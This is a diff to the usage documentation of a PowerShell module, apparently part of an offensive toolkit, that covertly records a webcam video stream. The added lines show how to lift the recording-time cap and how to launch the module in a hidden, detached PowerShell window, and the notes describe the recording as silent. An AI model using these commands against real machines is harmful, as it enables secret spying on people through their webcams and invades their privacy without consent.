@@ -82,8 +82,8 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam
 #Get module help
 Get-Help .\Invoke-webcamAvi.ps1 -full
 
-#Record webcam live stream for 15 seconds time
-.\Invoke-webcamAvi.ps1 -RecTime '15'
+#Record webcam live stream for 20 seconds time
+.\Invoke-webcamAvi.ps1 -RecTime '20'
 
 #Record webcam live and use %TMP% as working directory
 .\Invoke-webcamAvi.ps1 -WorkingDir "$Env:TMP"
@@ -93,13 +93,21 @@ Get-Help .\Invoke-webcamAvi.ps1 -full
 
 #silent install of python3 dependencies if missing.
 .\Invoke-WebCamAvi.ps1 -forceinstall
+
+  -- Final Notes --
+  
+#Invoke -reclimmit 'int' to bypass max_rec_time restrictions
+.\Invoke-WebCamAvi.ps1 -rectime '240' -reclimmit '240'
+
+#Execute cmdlet in a hidden terminal window for 60 seconds ( child detach from parent process - orphan )
+PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file Invoke-WebCamAvi.ps1 -rectime '60'"
 ```
 
 <br />
 
 **Final Notes:**
 ```powershell
-Remark: Python its mandatory requiremente to run cmdlet..
+Remark: Python 3 its mandatory requirement to run cmdlet ..
 Invoke-webcamAvi cmdlet automates the execution of 'WebCam.py' and python packages dependencies.
 Video recording (silent) its stored on cmdlet working directory under the name of: "meterpeter.avi"
 ```
